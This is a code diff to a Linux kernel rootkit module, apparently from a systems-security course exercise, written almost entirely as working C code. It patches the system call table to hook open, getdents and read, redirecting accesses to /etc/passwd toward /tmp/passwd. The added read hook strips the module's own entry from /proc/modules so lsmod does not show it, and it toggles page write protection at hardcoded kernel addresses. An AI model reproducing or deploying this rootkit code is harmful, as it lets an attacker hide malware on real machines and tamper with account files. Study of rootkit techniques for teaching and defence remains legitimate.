@@ -22,7 +22,7 @@ struct linux_dirent {
   unsigned short d_reclen;
   char d_name[BUFFLEN];
 };
-static char *sneaky_process_id = "";
+static char *sneaky_process_id = "default";
 module_param(sneaky_process_id, charp, 0);
 
 //These are function pointers to the system calls that change page
@@ -38,23 +38,27 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 //We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 
+int enter_lsmod=0;
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 //asmlinkage int (*original_call)(const char *pathname, int flags);
-asmlinkage int (*myopen)(const char *pathname, int flags);
+asmlinkage int (*myopen)(const char *pathname, int flags,mode_t mode);
 asmlinkage int (*mygetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-//asmlinkage ssize_t (*myread)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*myread)(int fd, void *buf, size_t count);
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_open(const char *pathname, int flags,mode_t mode)
 {
   //printk(KERN_INFO "Very, very Sneaky!\n");
   const char *src_file = "/tmp/passwd";
   if(strcmp(pathname, "/etc/passwd") == 0){
-    copy_to_user((void*)pathname, src_file, strlen(src_file)+1);
-  } 
-  return myopen(pathname, flags);
+    copy_to_user((void*)pathname, src_file, 12);//size of length
+  }
+  if (strcmp(pathname, "/proc/modules") == 0){
+    enter_lsmod=1;
+  }
+  return myopen(pathname, flags,mode);
 }
 /*
 struct linux_dirent {
@@ -86,7 +90,27 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
   return ans;
 }
 
-
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  ssize_t ans=myread(fd,buf,count);
+  char * left=NULL;
+  char *right=NULL;
+  ssize_t size_of_target=0;
+  ssize_t move_size=0;
+  if(ans==0||enter_lsmod==0) return ans; //no input or not enter lsmod
+  left= strstr(buf,"sneaky_mod");
+  if(left==NULL) return ans;// no sneaky_mod inside
+  right=left;
+  while(*right!='\n'){
+    right++;
+    size_of_target++;
+  }
+  move_size=ans-(ssize_t)((void *)left-buf)-size_of_target-1;
+  ans-=size_of_target+1;
+  right++;
+  memmove(left,right,move_size);
+  enter_lsmod=1;
+  return ans;
+}
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -118,8 +142,8 @@ static int initialize_sneaky_module(void)
  myopen = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
-  //myread = (void*)*(sys_call_table + __NR_read);
-  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
+  myread = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -149,7 +173,7 @@ static void exit_sneaky_module(void)
   //*(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_open) = (unsigned long)myopen;
   *(sys_call_table + __NR_getdents) = (unsigned long)mygetdents;
-  //*(sys_call_table + __NR_read) = (unsigned long)myread; 
+  *(sys_call_table + __NR_read) = (unsigned long)myread; 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
